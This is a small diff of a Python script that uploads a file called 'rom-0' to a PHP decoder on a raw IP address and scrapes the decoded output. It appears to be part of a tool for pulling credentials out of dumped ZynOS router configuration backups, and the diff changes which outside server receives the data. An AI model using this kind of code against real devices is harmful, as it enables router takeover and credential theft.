@@ -25,7 +25,7 @@ try:
 
     datagen, headers = multipart_encode({"uploadedfile": open("rom-0")})
 
-    request = urllib2.Request("http://50.57.229.26/decoded.php", datagen, headers)
+    request = urllib2.Request("http://198.61.167.113/zynos/decoded.php", datagen, headers)
 
     str1 = urllib2.urlopen(request).read()
     m = re.search('rows=10>(.*)', str1)
